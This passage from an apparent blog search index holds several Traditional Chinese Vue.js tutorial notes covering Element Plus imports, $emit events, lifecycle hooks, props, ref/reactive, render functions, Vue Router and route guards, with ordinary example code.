OK，到這邊以後基本上就配置好環境了，最後會來討論一下優化的部分。 最後的優化看到這邊你應該已經知道怎麼「按需引入」需要的東西了，不過我想介紹一個更優雅的寫法，畢竟你應該不會想像這樣子把所有東西都寫在 main.js 裡： 1234567891011121314151617181920212223242526import { createApp } from 'vue'import App from './App.vue'import router from './router'import { ElInput, ElForm, ElFormItem, ElButton, ElMessage, ElNotification // ...} from 'element-plus'const app = createApp(App)// register componentapp.component(ElInput.name, ElInput)app.component(ElForm.name, ElForm)app.component(ElFormItem.name, ElFormItem)app.component(ElButton.name, ElButton)// register pluginapp.use(ElMessage)app.use(ElNotification)app.use(router)app.mount('#app') 附註：plugin 指的是像 ElNotification 這種屬於 function 而不是元件的東西。 所以你可以建立一個 src/plugins/elementui.js： 123456789101112131415import { ElInput, ElForm, ElFormItem, ElButton, ElMessage, ElNotification, // ...} from 'element-plus'// componentsexport const elComponents = [ElInput, ElForm, ElFormItem, ElButton, ...]// pluginsexport const elPlugins = [ElMessage, ElNotification, ...] 接著在 main.js 的時候就可以乾淨很多： 123456789101112131415161718import { createApp } from 'vue'import App from './App.vue'import router from './router'import { elComponents, elPlugins } from './plugin/elementui'const app = createApp(App)// register componentelComponents.forEach((c) =&gt; { app.component(c.name, c)})// register pluginelPlugins.forEach((p) =&gt; { app.use(p)})app.use(router)app.mount('#app')","link":"/2022/07/23/vue-element-plus-set-up/"},{"title":"Vue－接住我的事件吧（$emit）","text":"抓住你~ 簡述Vue 的事件比較特別一些，不是透過 props，而是透過 $emit 來建立一個「custom event」，直接來看例子： 12345678910111213141516171819202122232425&lt;template&gt; &lt;div class=\"backdrop\"&gt; &lt;div class=\"modal\" :class=\"{ sale: isSale }\"&gt; &lt;div class=\"content\"&gt; &lt;h2&gt;{{ user.name }}&lt;/h2&gt; &lt;p&gt;{{ user.email }}&lt;/p&gt; &lt;!-- @click 執行 onClick handler --&gt; &lt;button class=\"btn\" @click=\"onClick\"&gt;Close&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default { name: 'Modal', props: ['user'], methods: { onClick() { // 拋出 custom event this.$emit('onClose') } } }&lt;/script&gt; 當 child emit 出一個事件後，parent 就可以直接拿這個 event 來用： 1234567891011121314151617181920212223242526272829303132333435363738&lt;template&gt; &lt;div class=\"container\"&gt; &lt;div class=\"block\"&gt; &lt;button class=\"btn\" @click=\"onOpen\"&gt;Show modal&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- @onClose = 從 Modal 傳出的 custom event --&gt; &lt;Modal v-show=\"isModal\" :user=\"user\" @onClose=\"onClose\" /&gt;&lt;/template&gt;&lt;script&gt; import Modal from './components/Modal.vue' export default { name: 'App', components: { Modal }, data() { return { isModal: false, user: { name: 'PeaNu', email: 'PeaNug@peanu.dev' } } }, methods: { onOpen() { this.isModal = true }, // @onClose 觸發時的 handler onClose() { this.isModal = false } } }&lt;/script&gt; 不過這邊其實還是可以用 React 的思維來做（個人覺得 React 的作法更直覺），就是「把 function 寫好後再當作 props 傳下去」，像這樣： 12345678910111213141516171819202122232425262728293031&lt;template&gt; &lt;div class=\"container\"&gt; &lt;button class=\"btn\" @click=\"onOpen\"&gt;Show modal&lt;/button&gt; &lt;/div&gt; &lt;!-- :onClose = 用來關掉 modal 的 handler --&gt; &lt;Modal v-show=\"isModal\" :onClose=\"onClose\" /&gt;&lt;/template&gt;&lt;script&gt; import Modal from './components/Modal.vue' export default { name: 'App', components: { Modal }, data() { return { isModal: false, } }, methods: { onOpen() { this.isModal = true } onClose() { this.isModal = false } } }&lt;/script&gt; 1234567891011121314151617&lt;template&gt; &lt;div class=\"backdrop\"&gt; &lt;div class=\"modal&gt; &lt;div class=\"content\"&gt; ... &lt;button class=\"btn\" @click=\"onClose\"&gt;Close&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default { name: 'Modal', props: ['user', 'isSale', 'onClose'] // 接收 props}&lt;/script&gt; 帶上參數emit 出去的事件的是可以帶入參數的，只要在 emit 的時候帶進去就好了： 123456// Popup.vuemethods: { onClick() { this.$emit('onClick', 'my param') }} 123456789101112131415&lt;template&gt; &lt;Popup @onClick=\"handle\" /&gt;&lt;/template&gt;&lt;script&gt; export default { name: 'App', methods: { handle(param) { // my param console.log(param) } } }&lt;/script&gt; 如果你希望直接在 inline 中存取參數的話，可以這樣子寫： 1234567891011121314&lt;template&gt; &lt;Popup v-if=\"isShowPopup\" @onClick=\"isShowPopup = $event\" /&gt;&lt;/template&gt;&lt;script&gt; export default { name: 'App', data() { return { isShowPopup: false } } }&lt;/script&gt; 附註：我知道這例子有點怪，不過重點是理解可以這樣用就好。 參數會直接用 $event 來表示，所以就可以用它來取得。","link":"/2022/08/03/vue-emit/"},{"title":"Vue－事件基礎","text":"最基本但也最重要。 簡述先用一個最簡單的 click 事件來說明： 123456&lt;div id=\"app\"&gt; &lt;h2&gt;{{ message }} - {{ name }} - {{ age }}&lt;/h2&gt; &lt;button @click=\"age++\"&gt;Increase&lt;/button&gt; &lt;button @click=\"age--\"&gt;Decrease&lt;/button&gt; &lt;div @click=\"message = 'Hello PeaNu'\"&gt;Change message&lt;/div&gt;&lt;/div&gt; 這邊就是熟悉的「字串式 JS」，雖然看起來是字串 but 實際上是在寫 JS。 不過要特別注意的地方是「不需要用 function 來包住」，像這樣： 1&lt;button @click=\"() =&gt; age--\"&gt;Decrease&lt;/button&gt; 如果你跟我一樣是以前是寫 React 的話一定會覺得很不科學，所以特別強調一下這點。 這樣子寫的優點？後來發現這樣子寫其實也算是有一些小優勢。如果用 React 的觀念來做 togggle 的話，我們通常會這樣寫： 1234567891011121314151617&lt;ul&gt; &lt;li v-for=\"user of users\" class=\"default\" :class=\"{ online: user.isOnline}\" @click=\"toggleOnline(user.name)\" &gt; &lt;!-- onClick handler --&gt; &lt;div&gt; &lt;img :src=\"user.img\" :alt=\"user.name\" /&gt; &lt;/div&gt; &lt;div&gt; {{ user.name }} &lt;br /&gt; {{ user.age }} &lt;/div&gt; &lt;/li&gt;&lt;/ul&gt; 1234567methods: { toggleOnline(name) { this.users = this.users.map((u) =&gt; ( u.name === name ? { ...u, isOnline: !u.isOnline } : u) ) }} 但如果寫成 inline 的話可以非常簡單： 1234567891011121314151617&lt;ul&gt; &lt;li v-for=\"user of users\" class=\"default\" :class=\"{ online: user.isOnline}\" @click=\"user.isOnline = !user.isOnline\" &gt; &lt;!-- 輕輕鬆鬆 --&gt; &lt;div&gt; &lt;img :src=\"user.img\" :alt=\"user.name\" /&gt; &lt;/div&gt; &lt;div&gt; {{ user.name }} &lt;br /&gt; {{ user.age }} &lt;/div&gt; &lt;/li&gt;&lt;/ul&gt; 這是因為在 Vue 可以用「ｍ utable」的方式來改資料，所以利用這個特型來寫成 inline 形式的話會發現非常方便。 $Event 物件前面有說過在 Vue 裡面的 Event handler 沒辦法再用一個 function 來包住，像這樣： 1&lt;button @click=\"() =&gt; age--\"&gt;Decrease&lt;/button&gt; 這時候如果想取得 Event 物件的話怎麼辦？ 在「沒有自訂參數」的情況下 Vue 會自動幫你帶進去，所以你可以在元件中取得： 123456789const app = Vue.createApp({ methods: { handleEvent(e) { console.log(e.type) } }})app.mount('#app') 但如果有的話怎麼辦？像這樣子： 1&lt;div @mouseover=\"handleEvent(5)\"&gt;mouseover&lt;/div&gt; 這時候你就得手動帶進去才行，不然是拿不到 Event 物件的，要改成這樣： 1&lt;div @mouseover=\"handleEvent($event, 5)\"&gt;mouseover&lt;/div&gt;","link":"/2022/07/24/vue-event/"},{"title":"Vue－生命週期","text":"必備知識之一。 簡述先來看個經典圖： beforeCreate 元件未建立，DOM 還沒被編譯（什麼都不能存取） created 元件已建立，但 DOM 還沒被編譯（可以存取 Data） beforeMount DOM 編譯完成，但還沒 mount 上去（到這邊就可以存取 DOM 了） mounted DOM 放到畫面上了。 beforeUpdate 在重新渲然之前 updated 重新渲染到畫面上以後 beforeUnmount unmount 以前 unMounted unmount 以後 附註： 打 API 通常會在 mounted 或是更之前的 hook，而 beforeUnmount 就是 clean function 在 lifecycle hook 中可以直接透過 this 來取得 props，不需要透過 this.$props 有更新到「畫面」才會進到 update 區塊，只是更新 data 的話不會 範例 mounted &amp; updated","link":"/2022/08/06/vue-lifecycle/"},{"title":"Vue－傳遞資料的好夥伴（props）","text":"前端框架必備功能。 簡述props 大概是前端框架中很常見的術語，就算你沒有用過應該也聽過它，所以這邊就稍微過一下。 假設我有一個 Modal 元件，我希望他的內容是從父層傳下來的，那就會這樣做： 123456789101112131415161718192021222324252627&lt;!-- App.vue --&gt;&lt;template&gt; &lt;div class=\"container\"&gt; ... &lt;/div&gt; &lt;!-- :user = 我們要傳進去的 props --&gt; &lt;Modal :user=\"user\" /&gt;&lt;/template&gt;&lt;script&gt;import Modal from './components/Modal.vue'export default { name: 'App', components: { Modal }, data() { return { // props 綁定的資料 user: { name: 'PeaNu', email: 'PeaNug@peanu.dev' } } }} 123456789101112131415161718&lt;!-- Modal.vue --&gt;&lt;template&gt; &lt;div class=\"backdrop\"&gt; &lt;div class=\"modal\"&gt; &lt;div class=\"content\"&gt; &lt;h2&gt;{{ user.name }}&lt;/h2&gt; &lt;p&gt;{{ user.email }}&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default { name: 'Modal', props: ['user'] // 這邊就可以接收到 props }&lt;/script&gt; 其實觀念都跟 React 差不多，只是寫法有點不太一樣而已。","link":"/2022/08/02/vue-props/"},{"title":"Vue－Composition API（Ref & Reactive）","text":"很重要的東西。 比較不一樣的 ref過去在 Options API 裡要存取 DOM 元素的話，我們通常會這樣寫： 1234567891011121314151617&lt;template&gt; &lt;div class=\"home\"&gt; &lt;p ref=\"p\"&gt;Hello Composition API&lt;/p&gt; &lt;button @click=\"logRef\"&gt;Click Me&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default { methods: { logRef() { // 印出 DOM 節點資訊 console.log(this.$refs.p) } } }&lt;/script&gt; 之所以能夠這樣子做是因為我們有 this，這個 this 代表的是 Vue 這個實體，而 Vue 實體上會自帶 $ref 來儲存 DOM 元素的資訊。 可是在 Composition API 中有一個很重要的區別，那就是： setup 沒有 this 值 setup 沒有 this 值 setup 沒有 this 值 如果我試著在 setup 中存取 this 值，那只會得到 undefined： 123456export default { setup() { // undefined console.log(this) }} 所以正確的作法會變成這樣： 1234567891011121314151617181920212223&lt;template&gt; &lt;div class=\"home\"&gt; &lt;!-- bind ref --&gt; &lt;p ref=\"pTag\"&gt;Hello Composition API&lt;/p&gt; &lt;button @click=\"logRef\"&gt;Click Me&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; // 把 ref 從 Vue 的實體中取出 import { ref } from 'vue' export default { setup() { // 初始值為 null const pTag = ref(null) // reference Object &amp; Node &lt;p&gt; const logRef = () =&gt; console.log(pTag, pTag.value) return { pTag, logRef } } }&lt;/script&gt; 附註：ref 儲存的值是一個 Object，其中 value 屬性就是我們儲存的值 這樣子我們就能在按下按鈕時拿到 &lt;p&gt; 的 DOM 節點。 這裡你可能會想說 ref 的初始值為什麼要設成 null？難道沒辦法直接設為 &lt;p&gt; 嗎？ 答案是沒有辦法。 我們先回憶一下 setup 的觸發時機。前面有說過 setup 是跑在最一開始的 hook，既然如此，在這個時機點有可能存取到 DOM 元素嗎？當然不可能，所以才需要透過這樣的方式來做： 把 pTag return 到外面讓它跟 template 做繫結 透過 logRef 這種 callback 的形式來印出 pTag 的值 所以要在 setup 中去操作 DOM 元素也是不可能的，因為 setup 執行的當下並沒有任何 DOM 的存在。 總之這個觀念要一定要銘記在心。 ref 更大的用途（Reactive）ref 除了拿來存取 DOM 元素以外，更常被用來設置「Reactive」 的值。 前面我們有說過在 setup 中建立的變數在預設下沒有辦法「隨著更新反應到畫面上」，但是如果改用 ref 就可以改變這件事情，像這樣： 1234567891011121314151617181920212223&lt;template&gt; &lt;div class=\"home\"&gt; &lt;p&gt;Hello, my name is {{ name }}, and I'm {{ age }} years old&lt;/p&gt; &lt;button @click=\"changeName\"&gt;Click Me&lt;/button&gt; &lt;button @click=\"age++\"&gt;Add 1 to age&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import { ref } from 'vue' export default { setup() { const name = ref('PeaNu') const age = ref(24) const changeName = () =&gt; { name.value = 'PPB' } return { name, age, changeName } } }&lt;/script&gt; ref(...) 會建立一個物件，並且把我們儲存的值放在 value 屬性上，就跟 React 的 useRef 會儲存在 current 屬性上是一樣的概念。 接著當我們透過 changeName 來更新值的時候，神奇的事情就發生了，畫面上的 name 會確實會被同步更新為 PPB，因為現在這個 name 是「Reactive」的。 另一種作法：reactive要讓一個變數變成 Reactive 還有另一個方法，就是改用 reactive 來建立，像這樣： 1234567891011121314151617181920212223&lt;template&gt; &lt;div class=\"home\"&gt; &lt;p&gt;Hello, my name is {{ user.name }}, and I'm {{ user.age }} years old&lt;/p&gt; &lt;button @click=\"changeName\"&gt;Click Me&lt;/button&gt; &lt;button @click=\"user.age++\"&gt;Add 1 to age&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import { reactive } from 'vue' export default { setup() { // 建立 reactive 物件 const user = reactive({ name: 'PeaNu', age: 24 }) const changeName = () =&gt; { user.name = 'PPB' } return { user, changeName } } }&lt;/script&gt; 這樣子也可以達到一樣的效果，不過要注意 reactive 的值必須是一個「Object」，它沒辦法存「Primitive」的值。 所以我才會改成用 user 來建立物件，而不是像 ref 一樣用「純值」來儲存。 總之兩種方法都是 OK 的，不過你應該會比較常看到 reactive 的作法。 reactive 的好夥伴：toRefs剛剛建立的 reactive 範例中有一個麻煩的點是「必須透過存取屬性的方式來取值」，像是 123456&lt;template&gt; &lt;div class=\"home\"&gt; &lt;!-- 得透過 user 來取得 name --&gt; &lt;p&gt;Hello, my name is {{ user.name }}, and I'm {{ user.age }} years old&lt;/p&gt; &lt;/div&gt;&lt;/template&gt; 如果能夠像 ref 一樣直接填 name 的話就更好了對吧！所以 Vue 提供了 toRefs（注意有 s）這個方法，用途就是把 reactive 的每個屬性轉成 ref，像這樣： 123456789101112&lt;script&gt; import { reactive, toRefs } from 'vue' export default { setup() { const user = reactive({ name: 'PeaNu', age: 24 }) // toRefs 會回傳 { ref1: ..., ref2: ... }，所以這邊可以解構 return { ...toRefs(user) } } }&lt;/script&gt; 我私心覺得這樣是最方便的作法，因為： 在 template 中不用再透過 obj.property 來存取 在 script 中不用再透過 ref.value 來存取資料 總結來說就是一舉兩得，真的是很棒的功能。","link":"/2022/08/12/vue-ref-and-reactive/"},{"title":"Vue－取得 DOM 元素（$ref）","text":"似曾相似。 有時候你可能會想直接操作 DOM 元素，這時候能這樣做： 123456789101112131415161718192021222324&lt;template&gt; &lt;div class=\"wrap\"&gt; &lt;!-- 加上 ref 屬性 --&gt; &lt;input type=\"text\" ref=\"inputElem\" /&gt; &lt;button @click=\"handleClick\" /&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import Button from './components/Button.vue' export default { name: 'App', components: { Button }, methods: { handleClick() { // &lt;input type=\"text\"&gt; 節點 console.log(this.$refs.inputElem) } } }&lt;/script&gt; 加上 ref 屬性的元素可以透過 this.$ref.名稱 來存取。 上面我們把 input 加上 ref=\"inputElem\"，所以在 handler 中就可以用 this.$ref 來取得。 雖然這東西在 Composition API 裡有另一個用途，不過到時候再說吧。","link":"/2022/08/01/vue-ref/"},{"title":"Vue－好像很神秘的「h」","text":"還是自己寫的筆記比較好懂。 簡述簡單來說他只是另一種建立「Component」的方式，平常我們都是用 SFC 來建立，像這樣： 12345678910111213&lt;template&gt; &lt;div class=\"navbar\"&gt; &lt;div class=\"container\"&gt; &lt;div&gt; &lt;h1&gt;The dojo&lt;/h1&gt; &lt;/div&gt; &lt;div class=\"links\"&gt; &lt;router-link :to=\"{ name: 'Home' }\"&gt;Home&lt;/router-link&gt; &lt;router-link :to=\"{ name: 'Create' }\"&gt;Create&lt;/router-link&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt; 而 h 其實只是另一種建立 Component 的方式，他是透過「Function」來建立，寫起來會像這樣的感覺： 12345678910111213141516// @/components/VNode.jsimport { h } from 'vue'export default function VNode() { return { render() { return h(`h${this.level}`, { id: 'heading' }, this.$slots.default()) }, props: { level: { type: Number, required: true } } }} 接著在把它 Register 到某個元件上就能用了，像這樣： 123456789101112131415161718&lt;template&gt; &lt;div&gt;My VNode&lt;/div&gt; &lt;heading :level=\"1\"&gt;Heading 1&lt;/heading&gt; &lt;heading :level=\"2\"&gt;Heading 2&lt;/heading&gt; &lt;heading :level=\"3\"&gt;Heading 3&lt;/heading&gt; &lt;heading :level=\"4\"&gt;Heading 4&lt;/heading&gt; &lt;heading :level=\"5\"&gt;Heading 5&lt;/heading&gt;&lt;/template&gt;&lt;script&gt; import VNode from './components/VNode' export default { components: { heading: VNode() // 因為是函式所以要記得 invoke } }&lt;/script&gt; 附註：這樣看很抽象的話到可以看我寫的範例 這邊只是透過 level 來決定要渲染出 &lt;h1&gt; 還是 &lt;h2&gt; 等等？就這麼單純！ 不過你可能會想說「好好的 SFC 不寫，寫成這樣是在哈囉？」 讓我們來看看寫成 SFC 的話會長什麼樣子： 1234567891011121314151617181920212223242526272829303132&lt;!-- @/components/VNode2.js --&gt;&lt;template&gt; &lt;h1 v-if=\"level === 1\"&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/h1&gt; &lt;h2 v-else-if=\"level === 2\"&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/h2&gt; &lt;h3 v-else-if=\"level === 3\"&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/h3&gt; &lt;h4 v-else-if=\"level === 4\"&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/h4&gt; &lt;h5 v-else-if=\"level === 5\"&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/h5&gt; &lt;h6 v-else-if=\"level === 6\"&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/h6&gt;&lt;/template&gt;&lt;script&gt; export default { props: { level: { type: Number, required: true } } }&lt;/script&gt; 123456789101112131415161718&lt;template&gt; &lt;p&gt;My VNode&lt;/p&gt; &lt;VNode :level=\"1\"&gt;Heading1&lt;/VNode&gt; &lt;VNode :level=\"2\"&gt;Heading2&lt;/VNode&gt; &lt;VNode :level=\"3\"&gt;Heading3&lt;/VNode&gt; &lt;VNode :level=\"4\"&gt;Heading4&lt;/VNode&gt; &lt;VNode :level=\"5\"&gt;Heading5&lt;/VNode&gt;&lt;/template&gt;&lt;script&gt; import VNode from './components/VNode2' export default { components: { VNode } }&lt;/script&gt; 不懂的話一樣到這邊看範例。 這樣你應該明白差別在哪了吧？一個是「可讀性」比較好，但寫邏輯很麻煩，另一個是可讀性很爛，但方便「處理邏輯」的部分。 所以在某些情況下 render function 可能會是一個更好的選擇。","link":"/2022/08/08/vue-render-function/"},{"title":"Vue－Router Guard","text":"權限管理很重要。 簡述有時候我們會希望「某些路由」必須「符合條件」才可以進入，例如說像這樣的路由： 123456789101112const routes: Array&lt;RouteRecordRaw&gt; = [ { path: '/', name: 'Home', component: Home }, { path: '/chatroom', name: 'ChatRoom', component: ChatRoom }] 可以大概看出這是一個簡單的聊天室，不過我希望 /chatroom 只能給「已經登入的人」進入，沒登入的話我想把它導回首頁去，那麼我可以這樣做： 1234567891011121314151617181920212223242526const routes: Array&lt;RouteRecordRaw&gt; = [ { path: '/', name: 'Home', component: Home }, { path: '/chatroom', name: 'ChatRoom', component: ChatRoom, beforeEnter: ( to: RouteLocationNormalized, from: RouteLocationNormalized, next: NavigationGuardNext ) =&gt; { // 檢查目前的 user 資訊 const currentUser = auth.currentUser // 如果存在就通過，不然就導回首頁 if (currentUser) { next() } else { next({ name: 'Home' }) } } }] 這邊用到了 beforeEnter 這個 hook，說穿了就只是一個 function，Vue 會在「進入路由之前」幫你 trigger 他，讓你能夠在進入前做某些事。 錯誤知識補充我原本以為 next 的部分可以這樣子寫： 1next(currentUser ? to : from) 但這樣是不對的，會陷入無限迴圈。 如果你只是想讓他「到他原本該去的地方」，請直接呼叫 next() 就好，不需要再額外帶參數進去。因為帶了參數就會被視為「重新導向」，變成這樣的流程： 檢查 currentUser，有的話導向 /chatroom 執行進入 /chatroom 前的 beforeEnter 檢查 currentUser，有的話導向 /chatroom 執行進入 /chatroom 前的 beforeEnter … 以上補充內容就到這邊，接著來繼續介紹。 只要是路由相關的 hook 都會自動接收 to、from 和 next 這些參數。 to 和 from 分別為「目的地」和「出發地」的物件，內容大概長這樣： 附註：這是把 to 印出來的結果 簡單來說就是路由相關的資訊，有時候你可能會用到它來做判斷。 至於 next 就不一樣了，他是一個 function，用來決定「最後要跳轉去哪裡？」，如果沒有呼叫他的話就不會做任何事情，停留在原地一動也不動。 所以我們一開始的例子就只是做了以下幾件事： 檢查 currentUser 有沒有值？ 有的話，把他導向至 to 的位置（/chatrrom） 沒有的話，把他導向至 from 的位置（/） 這樣一來就可以避免掉「沒登入的人」進到聊天室了！","link":"/2022/08/25/vue-router-guard/"},{"title":"Vue－Router","text":"學 SPA 的好朋友。 簡述雖然很久很久以前有寫過 Vue-Router，不過那次實在是…寫得沒有很好，想起來都覺得黑歷史 XD，不過藉由這次重溫 Vue 可以來好好練習一下。 起手式這邊的範例會用 Vue-CLI 來從頭建立附帶「Vue-Router」的專案，反正主要是要練習路由的觀念，等你懂了以後要在現有專案裡面導入應該也不會有太大問題。 專案建好後先注意到 /src/router/index.js 這個檔案： 1234567891011121314151617181920212223242526272829import { createRouter, createWebHistory } from 'vue-router'import HomeView from '../views/HomeView.vue'import AboutView from '../views/AboutView.vue'const routes = [ { path: '/', name: 'home', component: HomeView }, { path: '/about', name: 'about', component: AboutView // 這是預設的設定，我下面會再解釋 // route level code-splitting // this generates a separate chunk (about.[hash].js) for this route // which is lazy-loaded when the route is visited. // component: () =&gt; import(/* webpackChunkName: \"about\" */ '../views/AboutView.vue') }]const router = createRouter({ history: createWebHistory(process.env.BASE_URL), routes})export default router 首先要在 Vue 建立路由的基本慣例是寫一隻獨立的 router.js，只要是跟路由有關的東西都會全部寫在這裡。這個跟 React 直接塞在 Component 中的做法還蠻不一樣的，我覺得各有各的好處。 接著來一段一段解釋 code 的部分： const routes = [{...}] 陣列中的每個物件都代表一個路由，像 '/' 會對應到 HomeView，/about 會對應的 AboutView，這個應該蠻好理解的。 const router = createRouter({{...}) 前面是設定路由，這邊才是正式配置（Register）路由，其實就是透過 Vue-Router 提供的 method 來做配置，這邊設定了兩個東西： 使用 history API，另一種是 hash API，簡單來說就是網址有沒有 # 的差別（但如果你有要部署的話最好是多看一些資料搞清楚實際差別，不然一定會踩雷） 設定路由資料（就是前面建立的 routes） 至於我註解起來的那一段是跟「延遲載入」相關的設定。簡單來說就是等我「進到那個路由時再幫我加載需要的 JS 就好，不需要在一開始就載入所有路由」，知道這樣就差不多了，如果真的想知道細節可以參考官方文件。 router-link－帶你趴趴走接著來介紹 Vue-Router 提供的元件 &lt;router-link&gt;，打開 /src/views/App.vue 會看到這個內容： 1234567&lt;template&gt; &lt;nav&gt; &lt;router-link to=\"/\"&gt;Home&lt;/router-link&gt; | &lt;router-link to=\"/about\"&gt;About&lt;/router-link&gt; &lt;/nav&gt; &lt;router-view /&gt;&lt;/template&gt; 它的用途就跟 &lt;a&gt; 很像，不過有一個很大的差別在於：會不會發 request 去拿 HTML。 &lt;a&gt; 的預設行為就是會發一個 request 到 server，但我們在寫 Vue 的時候並不想要這個行為，所以才會有 &lt;router-link&gt; 這個東西來取代它。 順道一提，&lt;router-view /&gt; 就是用來顯示某個路由的內容，可以想成是 React 的 &lt;Routes&gt;： 12345678910111213141516function App() { return ( &lt;Router&gt; &lt;nav&gt; &lt;Link to='/'&gt;Home&lt;/Link&gt; &lt;Link to='/about'&gt;About&lt;/Link&gt; &lt;/nav&gt; {/* router-view */} &lt;Routes&gt; &lt;Route {...props} /&gt; &lt;Route {...props} /&gt; &lt;Route {...props} /&gt; &lt;/Routes&gt; &lt;/Router&gt; )} 接下來補充一些 router-link 的特性，這些特性在某些時候還蠻方便的。 自帶 active class假設我現在在 /about 的路由，那對應的 link 就會有這樣的 class： 會自動添加 router-link-active 和 router-link-exact-active，通常會拿後面拿個來用（完全匹配）。 總之如果你想要針對 current 做 active 樣式的話這會是一個很方便的機制。 動態路徑除了原本的寫法以外，你也可以用 v-bind 的方式來指定，這個我直接示範比較快： 1234567&lt;template&gt; &lt;nav&gt; &lt;router-link :to=\"{ name: 'home' }\"&gt;Home&lt;/router-link&gt; | &lt;router-link :to=\"{ name: 'about' }\"&gt;About&lt;/router-link&gt; &lt;/nav&gt; &lt;router-view /&gt;&lt;/template&gt; 裡面可以傳入我們在 router.js 中寫好的 routes 物件來做對應（忘記內容的話可以拉回去上面看）。 雖然我覺得這樣的缺點是沒辦法一眼看出網址是啥，不過換來的好處是當你要改 path 時完全不需要來改 &lt;router-link&gt;，因為他是參考 name 的值，我覺得這在大型專案上會是很大的優勢。 動態路由參數假設你有一個路由是 /Products，而它底下可能會有不同的產品頁面，會用 /Products/A 或 /Products/B 之類的方式來表示。 這個時候你不可能去 hardcode 每一個路由，就會用「動態」的方式來撰寫。 在 Vue 寫的方式是這樣： 123456789101112const routes = [ { path: '/products', name: 'ProductList', component: ProductList }, { path: '/jobs/:id', name: 'ProductDetail', // 用 : 來表示 component: ProductDetail }] 所以這個 :id 就會是動態的值，如果我到 /job/A 的話 :id 就會是 A，job/B 就會是 B，以此類推。 取得參數值有了動態參數以後通常會需要在對應路由的元件（ProductDetail）來透過他來打 API 之類的，所以這邊介紹一下怎麼取得參數值： 12345678910111213141516&lt;template&gt; &lt;div&gt; &lt;h2&gt;Job Detail&lt;/h2&gt; &lt;!-- 取得參數值 --&gt; &lt;p&gt;Job detail: {{ $route.params.id }}&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default { created() { // 取得參數值 console.log('id', this.$route.params.id) } }&lt;/script&gt; $route 是一個物件，裡面會放蠻多跟路由有關的資訊，不過這邊主要會用到的是 params，代表動態參數。 除了透過 $route 以外還有一種比較特別的方法，就是透過 props： 123456789101112&lt;template&gt; &lt;div&gt; &lt;h2&gt;Job Detail&lt;/h2&gt; &lt;p&gt;Job detail: {{ id }}&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default { props: ['id'] }&lt;/script&gt; 要怎麼拿到這個 props？很簡單，只要到 router.js 開啟這功能就好： 12345678const routes = [ { path: '/jobs/:id', name: 'JobDetail', component: JobDetail, props: true // 啟用 props 功能 }] 手動切換路由除了用 &lt;router-link&gt; 以外，也可以用手動的方式來切換路由，技術上來說叫做「Programmatic Navigation」： 12345678910111213&lt;template&gt; &lt;h2&gt;Product List&lt;/h2&gt; &lt;div v-for=\"product of products\" :key=\"product.id\"&gt; &lt;h3 @click=\"$router.push({ name: 'ProductsDetail', params: { id: product.id } })\" &gt; {{ product.title }} &lt;/h3&gt; &lt;/div&gt;&lt;/template&gt; 如果你覺得這樣子看起來很麻煩的話也可以寫成這樣子： 123456&lt;template&gt; &lt;h2&gt;Product List&lt;/h2&gt; &lt;div v-for=\"product of products\" :key=\"product.id\"&gt; &lt;h3 @click=\"$router.push(`/products/${product.id}`)\"&gt;{{ product.title }}&lt;/h3&gt; &lt;/div&gt;&lt;/template&gt; 更多的寫法可以參考這裡 重新導向這邊直接看 code 吧： 12345678910111213const routes = [ // 假設這是新的 { path: '/jobs', name: 'JobList', component: JobList }, // 假設這是舊的 { path: '/all-jobs', redirect: 'jobs' }] 為了把舊的網址都導向到新的位置，我們可以像上面這樣子來重新導向。 404 頁面Vue 的寫法比較特別一點，要透過 params 搭配正則表達式的方式來做，像這樣： 1234567const routes = [ { path: '/:catchAll(.*)', name: 'NotFound', component: NotFound }] 裡面的 catchAll 是自訂名稱，你喜歡的話也可以叫 abc。總之重點在於 () 中的正則表達式，只要符合條件就會進到這個路由。 小陷阱－在不同路上使用同的元件這是我自己實作時踩到的雷，先來看看當時的情境： 123456789101112131415161718const routes = [ { path: '/', name: 'home', component: Home }, { path: '/add-new-project', name: 'AddProject', component: Form // 共用元件 }, { path: '/project/:id', name: 'EditProject', component: Form, // 共用元件 props: true }] 之所以會共用同一個 Form 是因為這兩個只差在： 表單的初始值 提交表單時要更新資料 or 建立資料 可是當時就遇到了這樣的狀況： 明明就切換到不同的路由上了，但內容卻被緩存了下來，甚至根本沒有被 unmount（自己用生命週期 hook 實測的結果）。 不過在 Vue 裡面這是正常的現象，AKA「節能機制」。簡單來說就是 Vue 會盡可能把能重複利用的東西留下來用的關係。 要解決這個辦法的作法就是加上 key，至於要加在哪？以我們這邊的問題來說是出現在「路由顯示上」，所以很直覺的就會加在這裡： 1&lt;router-view :key=\"$route.path\" /&gt; 只要讓每一個路由都有唯一的 key，Vue 就會直接視為是不同的東西，強制重新渲染，就能解決這個問題了。 詳細可以參考這篇。","link":"/2022/08/09/vue-router/"},{"title":"Vue－我想放的是內容不是資料（Slot）","text":"寫元件時會用到。 這個就跟 React 的「Children」是差不多的東西，讓我們可以直接把 template 傳給元件使用，只是在 Vue 裡面叫作「Slot」，而且功能也更多一些。 App.vue： 1234567891011121314151617&lt;template&gt; &lt;div class=\"container\"&gt; &lt;div class=\"block\"&gt; &lt;button class=\"btn\" @click=\"onOpen\"&gt;Show modal&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;Modal v-show=\"isModal\" :isSale=\"isSale\" @onClose=\"onClose\"&gt; &lt;!-- basic slot --&gt; 